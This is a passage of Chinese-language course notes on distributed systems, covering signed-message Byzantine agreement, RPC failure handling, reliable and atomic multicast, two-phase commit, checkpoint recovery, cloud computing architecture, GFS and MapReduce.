<h3 id="带签名的消息-Sign-Message"><a href="#带签名的消息-Sign-Message" class="headerlink" title="带签名的消息 - Sign Message"></a>带签名的消息 - Sign Message</h3><p>在Oral Message的前提条件里再添加两个条件：</p>
<ol>
<li><p>Loyal general’s signature cannot be forged and contents cannot be altered.</p>
<p>忠诚的将军的签名不能被修改，对忠诚的将军的发出的消息的修改能够被检测到。</p>
</li>
<li><p>Anyone can verify authenticity of signature.</p>
<p>任何人都可以验证签名的真实性。</p>
</li>
</ol>
<p><strong>结论</strong></p>
<p>当$n \ge m + 2$时，能满足要求。</p>
<h2 id="故障检测"><a href="#故障检测" class="headerlink" title="故障检测"></a>故障检测</h2><p><strong>核心思想</strong></p>
<p>通过超时机制来检测某个进程是否发生了故障。</p>
<p><strong>问题</strong></p>
<p>无法区分是由于网络不可靠还是由于进程出现了故障导致的超时。</p>
<h2 id="可靠通信"><a href="#可靠通信" class="headerlink" title="可靠通信"></a>可靠通信</h2><h3 id="远程过程调用-RPC-中的五种失败形式"><a href="#远程过程调用-RPC-中的五种失败形式" class="headerlink" title="远程过程调用(RPC)中的五种失败形式"></a>远程过程调用(RPC)中的五种失败形式</h3><ol>
<li>客户不能定位服务器</li>
<li>客户到服务器的请求消息丢失</li>
<li>服务器在收到请求之后崩溃</li>
<li>从服务器到客户的响应消息丢失</li>
<li>客户在发送请求之后崩溃</li>
</ol>
<h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><ol>
<li><p><strong>客户不能定位服务器:</strong></p>
<p>让错误抛出一个异常 Just report back to client</p>
</li>
<li><p><strong>客户到服务器的请求消息丢失</strong></p>
<p>使操作系统或客户存根在发送请求时开启一个定时器，如果定时器超时了还没有收到应答，就重发消息。(个人感觉类似于ARQ自动请求重发)<br>Just resend message (and use messageID to uniquely identify messages) 只需重新发送消息(并使用messageID唯一标识消息)</p>
</li>
<li><p><strong>服务器在收到请求之后崩溃</strong></p>
<p>非常麻烦，有三种情况：</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451820.png" alt="image-20190420202228923"></p>
<p><strong>对服务器的期望:</strong></p>
<ol>
<li>至少一次语义：在服务器重启之前(或者重新绑定到一个新的服务器之前)等待并再次尝试操作。<br>At-least-once-semantics: The server guarantees it will carry out an operation at least once, no matter what.</li>
<li>最多一次语义：立即放弃并报告失败。<br>At-most-once-semantics: The server guarantees it will carry out an operation at most once, but possibly none at all.</li>
</ol>
<p><strong>客户可采取的4种策略:</strong></p>
<ol>
<li>不重发</li>
<li>总是重发</li>
<li>没有接收到第一次请求已经传送到服务器的确认时才重发</li>
<li>只有接受到服务器发送的请求确认时才重发</li>
</ol>
</li>
<li><p>从服务器到客户的响应消息丢失</p>
<ol>
<li><p>按幂等的方式组织所有的请求</p>
</li>
<li><p>改进版：客户为每一个请求分配一个序列号，通过在服务器上跟踪从每个客户收到的最近序列号，</p>
<p>服务器可以分辨原始的请求 与重发的请求，并拒绝执行第二次发出的请求，但是服务器还是要向</p>
<p>客户发送响应。</p>
</li>
</ol>
</li>
<li><p>客户在发送请求之后崩溃(孤儿问题)</p>
<p>孤儿：如果客户向服务器发送请求，请求做一些事情，但是在服务器回复之前就崩溃了，这时虽然计算是活动的，但是没有双亲等待结果，这种不需要的计算称为孤儿计算。</p>
<p>解决办法(4个)</p>
<ol>
<li><p><strong>孤儿消灭extermination</strong></p>
<p>在客户存根发送RPC消息之前进行进行日志记录来说明要做什么。在客户端重启之后，对日志进行检查然后<strong>明确</strong>的杀死孤儿。</p>
</li>
<li><p><strong>再生reincarnation</strong></p>
<p>当客户端重启时，就向所有的机器广播一个消息说明<strong>一个新时期的开始</strong>，当这样的广播到达后，<strong>所有</strong>与那个客户有关的远程计算都被杀死。</p>
</li>
<li><p><strong>优雅再生gentle reincarnation</strong></p>
<p>当时期广播到达时，每台机器都进行检查来查看是否存在远程计算，如果有，就尝试定位他的拥有者，只有当不能找到拥有者的时候才杀死该孤儿。</p>
</li>
<li><p><strong>到期expiration</strong></p>
<p>每个RPC都被给定一个标准的时间量T来进行工作，如果到时不能结束，就必须显示的请求另外的时间量。(类似于租约)</p>
</li>
</ol>
</li>
</ol>
<h2 id="可靠的组通信"><a href="#可靠的组通信" class="headerlink" title="可靠的组通信"></a>可靠的组通信</h2><h3 id="基本的可靠多播方法"><a href="#基本的可靠多播方法" class="headerlink" title="基本的可靠多播方法"></a>基本的可靠多播方法</h3><p>简单一提，就是保证消息不丢失。 Simple reliability: No messages lost.</p>
<h3 id="无等级的反馈控制"><a href="#无等级的反馈控制" class="headerlink" title="无等级的反馈控制"></a>无等级的反馈控制</h3><p>一种类似于分层次的多播，喝了口水，不讲了。</p>
<h3 id="原子多播"><a href="#原子多播" class="headerlink" title="原子多播"></a>原子多播</h3><h4 id="虚拟同步-virtually-synchronous-问题"><a href="#虚拟同步-virtually-synchronous-问题" class="headerlink" title="虚拟同步(virtually synchronous)问题"></a>虚拟同步(virtually synchronous)问题</h4><ol>
<li>保证多播到组视图G的消息被传送给G中的每个正常进程。</li>
<li>如果消息的发送方在多播期间崩溃，那么消息要么被投递给所有的进程，要么被每个进程忽略。</li>
</ol>
<p><strong>所有没有坏的节点应该看到相同的信息</strong></p>
<p><strong>保证1、2两个属性的可靠多播被称为虚拟同步。</strong></p>
<p><strong>例:</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451822.png" alt="image-20190420211038641"></p>
<p>P3在发送消息的时候崩溃了，在崩溃之前，它成功地将消息多播到了进程P2和P4，但是没有多播到P1。虚拟同步保证这个消息根本不会被传送。</p>
<p><strong>原理</strong></p>
<p>虚拟同步的原理是所有的多播都在视图改变之间进行，即，视图改变作为一个屏障，不能跨越它进行多播。</p>
<h4 id="消息排序"><a href="#消息排序" class="headerlink" title="消息排序"></a>消息排序</h4><p><strong>有四种消息排序方法</strong>：</p>
<ol>
<li><p><strong>不排序的多播</strong></p>
<p>是一种虚拟同步多播，它对接受不同进程发送的消息的次序不做任何保证。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451823.png" alt="image-20190420213116254"></p>
<p>P1给P2和P3发组内多播，由于没有接受消息顺序的约束，P2P3的接受顺序可能不同。</p>
</li>
<li><p><strong>FIFO顺序的多播</strong></p>
<p>通信层被强制按照消息发送的顺序传送来自<strong>同一进程</strong>的消息，对不同进程之间的顺序不作要求。</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451824.png" alt="image-20190420213306494"></p>
<p>如上图，不保证m1，m3之间的关系，所以对于P2和P3，只要m1在m2之前，m3在m4之前，就满足要求。</p>
</li>
<li><p><strong>按因果关系排序的多</strong></p>
<p>传送消息可以保留不同消息之间的潜在因果关系。如果m1和m2之间有因果关系，m1应该在m2之前，那么每个接收方在接受并向上交付消息时，都应该先交付m1再交付m2。</p>
</li>
<li><p><strong>全序多播</strong></p>
<p>不论消息传送是无序，FIFO顺序还是按因果关系排序，都需要在传送消息时，对所有的组成员按照相同的次序来传送。</p>
</li>
<li><p><strong>原子多播</strong></p>
<p>提供了全序的消息传送的虚拟同步可靠性多播称为<strong>原子多播</strong>。</p>
</li>
</ol>
<p><strong>比较</strong></p>
<table>
<thead>
<tr>
<th align="left">Multicast</th>
<th align="left">Basic Message Ordering</th>
<th align="left">Total-ordered Delivery?</th>
</tr>
</thead>
<tbody><tr>
<td align="left">Reliable multicast</td>
<td align="left">None</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">FIFO multicast</td>
<td align="left">FIFO-ordered delivery</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">Causal multicast</td>
<td align="left">Causal-ordered delivery</td>
<td align="left">No</td>
</tr>
<tr>
<td align="left">Atomic multicast</td>
<td align="left">None</td>
<td align="left">Yes</td>
</tr>
<tr>
<td align="left">FIFO atomic multicast</td>
<td align="left">FIFO-ordered delivery</td>
<td align="left">Yes</td>
</tr>
<tr>
<td align="left">Causal atomic multicast</td>
<td align="left">Causal-ordered delivery</td>
<td align="left">Yes</td>
</tr>
</tbody></table>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451825.png" alt="image-20190420214930797"></p>
<h4 id="虚拟同步的实现"><a href="#虚拟同步的实现" class="headerlink" title="虚拟同步的实现"></a>虚拟同步的实现</h4><p>消息m在发送发完成多播之前崩溃，所以没有接收到m的进程应该从其他地方知道他丢失了消息。</p>
<p><strong>稳定</strong></p>
<p>如果组G中所有进程都接收到了m，则称m是稳定的。</p>
<p><strong>实现原理</strong></p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451826.png" alt="image-20190420215708876"></p>
<ol>
<li><p>如图所示，进程4探测到进程7崩溃，于是它向所有进程发送view change消息。</p>
</li>
<li><p>进程6发送自身的所有不稳定消息，然后发送一个flush message。(看看别的进程有没有收到，进程6说:我认为这些消息是不稳定的，你们来看看，你再把不稳定的发给我，然后再 来分布式决策)</p>
</li>
<li><p>其余进程给进程6反馈一个flush消息，当进程6从其他每个进程那里都接受到一个flush消息时就建立了一个新的视图。</p>
</li>
<li><p>wangyu问：如何知道是不稳定的消息？</p>
<p>丁喝水答：根据view change消息来判断。4发送了进程7的view change消息，所以别人就知道关于7的有可能是不稳定的消息了。</p>
</li>
</ol>
<h2 id="分布式提交"><a href="#分布式提交" class="headerlink" title="分布式提交"></a>分布式提交</h2><p>实际上很简单，是一个事务处理的问题。麻烦在于分布式，涉及到了协作的问题。</p>
<h3 id="两阶段提交"><a href="#两阶段提交" class="headerlink" title="两阶段提交"></a>两阶段提交</h3><p>引入了协调者的概念。具体操作如下:</p>
<ol>
<li><p>协作者向所有的参与者发送一个VOTE_REQUEST消息。</p>
</li>
<li><p>当参与者接收到VOTE_REQUEST消息时，就向协作者返回一个VOTE_COMMIT消息通知协作者它已经</p>
<p>准备好本地提交事务中属于它的部分，否则就返回一个VOTE_ABORT消息。</p>
</li>
<li><p>协作者收集来自参与者的所有选票，如果所有的参与者都表决要提交事务，那么协作者就进行提交。在</p>
<p>这种情况下它向所有的参与者发送一个GLOBAL_COMMIT消息。但是，如果<strong>有一个</strong>参与者表决要取消事</p>
<p>物，那么协作者就决定取消事务并多播一个GLOBAL_ABORT消息。</p>
</li>
<li><p>每个提交表决的参与者都等待协作者的最后反应。如果参与者接收到一个GLOBAL_COMMIT消息，那</p>
<p>么他就在本地提交事务，否则当接收到一个GLOBAL_ABORT消息时，就取消本地事务。</p>
</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451827.png" alt="image-20190420220521993"></p>
<h4 id="什么时候阻塞问题"><a href="#什么时候阻塞问题" class="headerlink" title="什么时候阻塞问题"></a>什么时候阻塞问题</h4><ol>
<li>参与者可能在INIT状态等待来自协作者的VOTE_REQUEST消息；</li>
<li>协作者可能在WAIT状态阻塞，等待来自每个参与者的表决；</li>
<li>参与者可能在READY状态阻塞，等待协作者发送的全局表决消息。</li>
</ol>
<h4 id="不可靠问题-简单提了一句"><a href="#不可靠问题-简单提了一句" class="headerlink" title="不可靠问题(简单提了一句)"></a>不可靠问题(简单提了一句)</h4><ol>
<li>COMMIT的时候有可能失败</li>
<li>每一台机器也有可能失败</li>
<li>超时Time Out问题</li>
</ol>
<h3 id="三阶段提交"><a href="#三阶段提交" class="headerlink" title="三阶段提交"></a>三阶段提交</h3><p>喝口水，不讲了</p>
<h2 id="恢复"><a href="#恢复" class="headerlink" title="恢复"></a>恢复</h2><p>书上只是简单举了几个栗子，了解一下，我们就一起来了解一下，就不扩展太多了。</p>
<p>既然了解一下，那我就粘一下李博强的笔记，我也不看了。</p>
<ol>
<li><p><strong>回退回复backward recovery</strong></p>
<p>将系统从当前的错误状态回到先前的正确状态。必须定时记录系统的状态(称 为设置一个还原点)</p>
</li>
<li><p><strong>前向恢复(forward recovery)</strong></p>
<p>尝试从可以继续执行的某点开始把系统带入一个正确的新状态。</p>
</li>
<li><p><strong>检查点</strong></p>
<ol>
<li><p>Consistent Checkpoints检查点一致性问题</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451828.png" alt="image-20190420221032131"></p>
<p>划recovery line时，当且仅当系统提供可靠通信时，同一个状态下，发送的消息必须得被接收。(在可靠通信下，P1发送了一个消息，但是P2没接收，这就会出问题，如第二条recovery line的划分)</p>
</li>
<li><p>稳定存储问题(这个我就不讲了啊，喝口水)</p>
</li>
</ol>
</li>
<li><p>Message Logging消息日志</p>
<ol>
<li>是检查点的另一个思路，通过日志记录来进行查错。</li>
<li>尝试在日志中记录发送的消息，然后对消息进程重放，来替代检查点check point 。</li>
</ol>
</li>
</ol>
<h1 id="云计算-概述"><a href="#云计算-概述" class="headerlink" title="云计算 - 概述"></a>云计算 - 概述</h1><h2 id="Google文件系统-GFS"><a href="#Google文件系统-GFS" class="headerlink" title="Google文件系统(GFS)"></a>Google文件系统(GFS)</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451829.png" alt="image-20190421105555424"></p>
<h2 id="云计算技术体系结构"><a href="#云计算技术体系结构" class="headerlink" title="云计算技术体系结构"></a>云计算技术体系结构</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451830.png" alt="image-20190421110140267"></p>
<p><strong>云计算技术体系结构分为四层</strong></p>
<ul>
<li>物理资源层</li>
<li>资源池层</li>
<li>管理中间件层</li>
<li>SOA（Service-Oriented Architecture，面向服务的体系结构）构建层</li>
</ul>
<h3 id="物理资源层"><a href="#物理资源层" class="headerlink" title="物理资源层"></a>物理资源层</h3><p>包括计算机、存储器、网络设施、数据库和软件等。</p>
<h3 id="资源池层"><a href="#资源池层" class="headerlink" title="资源池层"></a>资源池层</h3><p>将大量<strong>相同类型</strong>的资源构成同构或接近同构的资源池，如计算资源池、数据资源池等。构建资源池更多的是<strong>物理资源的集成和管理工作</strong>，例如研究在一个标准集装箱的空间如何装下2000个服务器、解决散热和故障节点替换的问题并降低能耗。</p>
<h3 id="管理中间件层"><a href="#管理中间件层" class="headerlink" title="管理中间件层"></a>管理中间件层</h3><p>负责对<strong>云计算的资源进行管理</strong>，并<strong>对众多应用任务进行调度</strong>，使资源能够高效、安全地为应用提供服务。</p>
<h3 id="SOA构建层"><a href="#SOA构建层" class="headerlink" title="SOA构建层"></a>SOA构建层</h3><p>将云计算能力<strong>封装成标准的Web Services服务</strong>，并<strong>纳入SOA体系进行管理和使用</strong>，包括服务接口、服务注册、服务查找、服务访问和服务工作流等。管理中间件层和资源池层是云计算技术的最关键部分，SOA构建层的功能更多依靠外部设施提供。</p>
<h2 id="云计算实现机制"><a href="#云计算实现机制" class="headerlink" title="云计算实现机制"></a>云计算实现机制</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451831.png" alt="image-20190421110521483"></p>
<ul>
<li><p><strong>用户交互接口</strong></p>
<p>向应用以Web Services方式提供访问接口，获取用户需求。</p>
</li>
<li><p><strong>服务目录</strong></p>
<p>用户可以访问的服务清单。</p>
</li>
<li><p><strong>系统管理模块</strong></p>
<p>负责管理和分配所有可用的资源，其核心是<strong>负载均衡</strong>。</p>
</li>
<li><p><strong>配置工具</strong></p>
<p>负责在分配的节点上<strong>准备任务运行环境</strong>。</p>
</li>
<li><p><strong>监视统计模块</strong></p>
<p>负责监视节点的运行状态，并完成用户使用节点情况的统计。</p>
</li>
</ul>
<p><strong>执行过程</strong></p>
<p>用户交互接口允许用户从目录中选取并调用一个服务，该请求传递给系统管理模块后，它将为用户分配恰当的资源，然后调用配置工具为用户准备运行环境。</p>
<h2 id="云计算的特点"><a href="#云计算的特点" class="headerlink" title="云计算的特点"></a>云计算的特点</h2><ul>
<li>超大规模</li>
<li>高可扩展性</li>
<li>虚拟化</li>
<li>按需服务</li>
<li>高可靠性</li>
<li>极其廉价</li>
<li>通用性</li>
</ul>
<h1 id="云计算-GFS"><a href="#云计算-GFS" class="headerlink" title="云计算 - GFS"></a>云计算 - GFS</h1><h2 id="网格计算与云计算"><a href="#网格计算与云计算" class="headerlink" title="网格计算与云计算"></a>网格计算与云计算</h2><h3 id="网格计算"><a href="#网格计算" class="headerlink" title="网格计算"></a>网格计算</h3><ul>
<li>在动态变化、由多个机构组成的虚拟组织中协调资源共享和求解问题</li>
<li>实现跨组织跨平台异构资源的共享</li>
</ul>
<h3 id="云计算"><a href="#云计算" class="headerlink" title="云计算"></a>云计算</h3><ul>
<li>一种<strong>商业</strong>计算模型。</li>
<li>将计算任务分布在大量计算机构成的资源池上，使各种应用系统(用户)能够根据需要获取计算力、存储空间和信息服务。</li>
</ul>
<h3 id="网格计算与云计算的比较"><a href="#网格计算与云计算的比较" class="headerlink" title="网格计算与云计算的比较"></a>网格计算与云计算的比较</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451832.png" alt="image-20190421114530658"></p>
<h2 id="云计算的分类"><a href="#云计算的分类" class="headerlink" title="云计算的分类"></a>云计算的分类</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451833.png" alt="image-20190421115236700"></p>
<h2 id="云计算不是巨型机模式的简单回归"><a href="#云计算不是巨型机模式的简单回归" class="headerlink" title="云计算不是巨型机模式的简单回归"></a>云计算不是巨型机模式的简单回归</h2><p>云计算的本质是分布式计算，但有集中管理某些特征优点:</p>
<ul>
<li><p>更好的性能价格比；</p>
</li>
<li><p>多数应用是分布式的；</p>
</li>
<li><p>高可靠性</p>
<p>现代分布式系统具有高度容错机制；</p>
</li>
<li><p>可扩展性</p>
<p>买一台性能更高的大型机，或者再买一台性能相同的大型机的费用都比添加几台PC的费用高得多；</p>
</li>
<li><p>高度灵活性：能够兼容不同硬件厂商的产品，兼容低配置机器和外设而获得高性能计算。</p>
</li>
</ul>
<h2 id="Google云计算平台技术架构"><a href="#Google云计算平台技术架构" class="headerlink" title="Google云计算平台技术架构"></a>Google云计算平台技术架构</h2><ul>
<li><p>文件存储</p>
<p>Google Distributed File System，GFS</p>
</li>
<li><p>并行数据处理</p>
<p>MapReduce</p>
</li>
<li><p>分布式锁</p>
<p>Chubby</p>
</li>
<li><p>结构化数据表</p>
<p>BigTable</p>
</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451834.png" alt="image-20190421115533396"></p>
<h2 id="文件系统基础"><a href="#文件系统基础" class="headerlink" title="文件系统基础"></a>文件系统基础</h2><p><strong>什么是文件系统</strong>?</p>
<ul>
<li>FAT, FAT32, NTFS, EXT, ……</li>
<li>用于持久地存储数据的系统，通常覆盖在底层的物理存储介质上，如：硬盘、CD、磁带等</li>
</ul>
<p><strong>数据组织的基本单元</strong></p>
<p><strong>文件</strong></p>
<ul>
<li>具有文件名(1.txt)</li>
<li>通常支持层次化嵌套(目录结构)</li>
</ul>
<p><strong>文件路径</strong></p>
<ul>
<li>文件与目录的结合，用于定位文件</li>
<li>绝对路径，&#x2F;home&#x2F;aaron&#x2F;foo.txt</li>
<li>相对路径，docs&#x2F;someFile.doc</li>
</ul>
<p><strong>规范路径</strong></p>
<ul>
<li>定位文件的最短绝对路径</li>
<li>&#x2F;home&#x2F;aaron&#x2F;foo.txt, &#x2F;home&#x2F;..&#x2F;home&#x2F;aaron&#x2F;.&#x2F;foo.txt</li>
<li>所有规范路径的集合构成了文件系统的目录结构</li>
</ul>
<p><strong>文件系统的存储内容</strong></p>
<ul>
<li>主要内容：用户的实际数据</li>
<li><strong>元数据</strong>：驱动器元数据与文件元数据</li>
</ul>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451835.png" alt="image-20190421134431288"></p>
<p>文件系统设计的考虑因素</p>
<ul>
<li>最小存储单元<ul>
<li>较小可减少浪费空间，较大则可提高文件顺序读取速度</li>
</ul>
</li>
<li>文件系统的设计目标是提高访问速度还是提高使用率?</li>
</ul>
<p>文件系统的安全性</p>
<ul>
<li>多用户环境下的文件安全</li>
<li>读&#x2F;写权限分配</li>
<li>文件附带访问控制列表(ACL)</li>
</ul>
<p>文件系统缓存</p>
<ul>
<li><strong>提高文件系统读写效率</strong></li>
</ul>
<h2 id="GFS的假设与目标"><a href="#GFS的假设与目标" class="headerlink" title="GFS的假设与目标"></a>GFS的假设与目标</h2><p>硬件出错是正常而非异常</p>
<ul>
<li>系统应当由大量廉价、易损的硬件组成</li>
<li>必须保持文件系统整体的可靠性</li>
</ul>
<p>主要负载是流数据读写</p>
<ul>
<li>主要用于程序处理批量数据，而非与用户的交互或随机读写</li>
<li>数据写主要是“追加写”，“插入写”非常少</li>
</ul>
<p>需要存储大尺寸的文件</p>
<ul>
<li>存储的文件尺寸可能是GB或TB量级，而且应当能支持存储成千上万的大尺寸文件</li>
</ul>
<h2 id="GFS的设计思路"><a href="#GFS的设计思路" class="headerlink" title="GFS的设计思路"></a>GFS的设计思路</h2><p>将文件划分为若干块(Chunk)存储</p>
<ul>
<li>每个块固定大小(64M)</li>
</ul>
<p>通过冗余来提高可靠性</p>
<ul>
<li>每个数据块至少在3个数据块服务器上冗余</li>
</ul>
<p>通过单个master来协调数据访问、元数据存储</p>
<ul>
<li>结构简单，容易保持元数据一致性</li>
</ul>
<p>无缓存</p>
<h2 id="GFS架构"><a href="#GFS架构" class="headerlink" title="GFS架构"></a>GFS架构</h2><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451836.png" alt="image-20190421135452827"></p>
<h3 id="单一Master问题"><a href="#单一Master问题" class="headerlink" title="单一Master问题"></a>单一Master问题</h3><p>分布式系统设计告诉我们</p>
<ul>
<li>这是单点故障</li>
<li>这是性能瓶颈</li>
</ul>
<h3 id="单点故障问题"><a href="#单点故障问题" class="headerlink" title="单点故障问题"></a>单点故障问题</h3><p>采用多个(如3个)影子Master节点进行热备，一旦主节点损坏，立刻选举一个新的主节点服务</p>
<p>真实数据放在 chunk server 上，metadata放在Master节点上。用户访问时访问的是metadata（类似于索引）。</p>
<h3 id="性能瓶颈问题"><a href="#性能瓶颈问题" class="headerlink" title="性能瓶颈问题"></a>性能瓶颈问题</h3><p>尽可能减少数据存取中Master的参与程度</p>
<ol>
<li>不使用Master读取数据，仅用于保存元数据。</li>
<li>客户端缓存元数据</li>
<li>采用大尺寸的数据块(64M)</li>
<li>数据修改顺序交由Primary Chunk Server完成</li>
</ol>
<h3 id="Master节点的任务"><a href="#Master节点的任务" class="headerlink" title="Master节点的任务"></a>Master节点的任务</h3><ul>
<li>存储元数据</li>
<li>文件系统目录管理与加锁</li>
<li>与ChunkServer进行周期性通信<ul>
<li>发送指令，搜集状态，跟踪数据块的完好性</li>
</ul>
</li>
<li>数据块创建、复制及负载均衡<ul>
<li>对ChunkServer的空间使用和访问速度进行负载均衡，平滑数据存储和访问请求的负载</li>
<li>对数据块进行复制、分散到ChunkServer上</li>
<li>一旦数据块冗余数小于最低数，就发起复制操作</li>
</ul>
</li>
<li>垃圾回收<ul>
<li>在日志中<strong>记录</strong>删除操作，并将文件改名隐藏</li>
<li>缓慢地回收隐藏文件</li>
<li>与传统文件删除相比更简单、更安全</li>
</ul>
</li>
<li>陈旧数据块删除<ul>
<li><strong>探测陈旧的数据块</strong>，并删除</li>
</ul>
</li>
</ul>
<h3 id="GFS架构的特点"><a href="#GFS架构的特点" class="headerlink" title="GFS架构的特点"></a>GFS架构的特点</h3><p>采用中心服务器模式</p>
<ul>
<li>可以方便地增加Chunk Server</li>
<li>Master掌握系统内所有Chunk Server的情况，方便进行负载均衡</li>
<li>不存在元数据的一致性问题</li>
<li>不缓存数据<ul>
<li>GFS的文件操作大部分是流式读写，不存在大量的重复读写，使用Cache对性能提高不大</li>
<li>Chunk Server上的数据存取使用本地文件系统，如果某个Chunk读取频繁，文件系统具有Cache</li>
<li>从可行性看，Cache与实际数据的一致性维护也极其复杂</li>
</ul>
</li>
<li>在用户态下实现<ul>
<li>直接利用Chunk Server的文件系统存取Chunk，实现简单</li>
<li>用户态应用调试较为简单，利于开发</li>
<li>用户态的GFS不会影响Chunk Server的稳定性</li>
</ul>
</li>
<li>提供专用的访问接口<ul>
<li>未提供标准的POSIX访问接口</li>
<li>降低GFS的实现复杂度</li>
</ul>
</li>
</ul>
<h3 id="GFS的容错方法"><a href="#GFS的容错方法" class="headerlink" title="GFS的容错方法"></a>GFS的容错方法</h3><h4 id="Chunk-Server容错机制"><a href="#Chunk-Server容错机制" class="headerlink" title="Chunk Server容错机制"></a>Chunk Server容错机制</h4><ul>
<li>每个Chunk有多个存储副本（通常是3个），分别存储于不通的服务器上</li>
<li>每个Chunk又划分为若干Block（64KB），每个Block对应一个32bit的校验码，保证数据正确（若某个Block错误，则转移至其他Chunk副本）</li>
</ul>
<h4 id="Master容错-影子节点热备"><a href="#Master容错-影子节点热备" class="headerlink" title="Master容错(影子节点热备)"></a>Master容错(影子节点热备)</h4><ul>
<li>三类元数据：命名空间（目录结构）、Chunk与文件名的映射（写日志提供容错）以及Chunk副本的位置信息</li>
<li>前两类通过日志提供容错，Chunk副本信息存储于Chunk Server，Master出现故障时可恢复</li>
</ul>
<h1 id="云计算-MapReduce"><a href="#云计算-MapReduce" class="headerlink" title="云计算 - MapReduce"></a>云计算 - MapReduce</h1><p>MapReduce 是一个分布式运算程序的编程框架，是用户开发“基于hadoop的数据分析应用”的核心框架。MapReduce 核心功能是将用户编写的业务逻辑代码和自带默认组件整合成一个完整的分布式运算程序，并发运行在一个 hadoop 集群上。</p>
<ul>
<li>一个软件架构，是一种处理海量数据的并行编程模式</li>
<li>用于大规模数据集（通常大于1TB）的并行运算</li>
<li>MapReduce实现了Map和Reduce两个功能</li>
<li><ul>
<li>Map把一个函数应用于集合中的所有成员，然后返回一个基于这个处理的结果集</li>
<li>Reduce对结果集进行分类和归纳</li>
<li>Map()和 Reduce() 两个函数可能会并行运行，即使不是在同一的系统的同一时刻</li>
</ul>
</li>
</ul>
<h2 id="为什么需要MapReduce？"><a href="#为什么需要MapReduce？" class="headerlink" title="为什么需要MapReduce？"></a>为什么需要MapReduce？</h2><ol>
<li>海量数据在单机上处理因为硬件资源限制，无法胜任</li>
<li>而一旦将单机版程序扩展到集群来分布式运行，将极大增加程序的复杂度和开发难度</li>
<li>引入 MapReduce 框架后，开发人员可以将绝大部分工作集中在业务逻辑的开发上，而将分布式计算中的复杂性交由框架来处理。</li>
</ol>
<h3 id="Google-MapReduce执行流程"><a href="#Google-MapReduce执行流程" class="headerlink" title="Google MapReduce执行流程"></a>Google MapReduce执行流程</h3><p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211451837.png" alt="image-20190421142939749"></p>
<ol>
<li>一个MapReduce程序启动的时候，最先启动的是 MRAppMaster， MRAppMaster 启动后根据本次 job 的描述信息，计算出需要的 maptask 实例数量，然后向集群申请机器启动相应数量的 maptask 进程</li>
<li>maptask 进程启动之后，根据给定的数据切片(哪个文件的哪个偏移量范围)范围进行数据处理，主体流程为：<ol>
<li>利用客户指定的 inputformat 来获取 RecordReader 读取数据，形成输入 KV 对</li>
<li>将输入 KV 对传递给客户定义的 map()方法，做逻辑运算，并将 map()方法输出的 KV 对收 集到缓存</li>
<li>将缓存中的 KV 对按照 K 分区排序后不断溢写到磁盘文件 （超过缓存内存写到磁盘临时文件，最后都写到该文件，ruduce 获取该文件后，删除 ）</li>
</ol>
</li>
<li>MRAppMaster 监控到所有 maptask 进程任务完成之后（真实情况是，某些 maptask 进 程处理完成后，就会开始启动 reducetask 去已完成的 maptask 处 fetch 数据），会根据客户指 定的参数启动相应数量的 reducetask 进程，并告知 reducetask 进程要处理的数据范围（数据分区）</li>
<li>Reducetask 进程启动之后，根据 MRAppMaster 告知的待处理数据所在位置，从若干台 maptask 运行所在机器上获取到若干个 maptask 输出结果文件，并在本地进行重新归并排序， 然后按照相同 key 的 KV 为一个组，调用客户定义的 reduce()方法进行逻辑运算，并收集运算输出的结果 KV，然后调用客户指定的 outputformat 将结果数据输出到外部存储</li>
</ol>
<h2 id="MapReduce的容错"><a href="#MapReduce的容错" class="headerlink" title="MapReduce的容错"></a>MapReduce的容错</h2><h3 id="Worker故障"><a href="#Worker故障" class="headerlink" title="Worker故障"></a>Worker故障</h3><ul>
<li>Master 周期性的ping每个worker。如果master在一个确定的时间段内没有收到worker返回的信息，那么它将把这个worker标记成失效</li>
<li>重新执行该节点上已经执行或尚未执行的Map任务</li>
<li>重新执行该节点上未完成的Reduce任务，已完成的不再执行</li>
</ul>
<h3 id="Master故障"><a href="#Master故障" class="headerlink" title="Master故障"></a>Master故障</h3><ul>
<li>定期<strong>写入检查点数据</strong></li>
<li>从<strong>检查点</strong>恢复</li>
</ul>
<h2 id="MapReduce的优化"><a href="#MapReduce的优化" class="headerlink" title="MapReduce的优化"></a>MapReduce的优化</h2><h3 id="任务备份机制"><a href="#任务备份机制" class="headerlink" title="任务备份机制"></a>任务备份机制</h3><p>慢的workers 会严重地拖延整个执行完成的时间</p>
<ul>
<li>由于其他的任务占用了资源</li>
<li>磁盘损坏</li>
</ul>
<p>解决方案: 在临近结束的时候，启动多个进程来执行尚未完成的任务</p>
<ul>
<li>谁先完成，就算谁</li>
</ul>
<p>可以十分显著地提高执行效率</p>
<h3 id="本地处理"><a href="#本地处理" class="headerlink" title="本地处理"></a>本地处理</h3><p>Master 调度策略:</p>
<ul>
<li>向GFS询问获得输入文件blocks副本的位置信息</li>
<li>Map tasks 的输入数据通常按 64MB来划分 (GFS block 大小)</li>
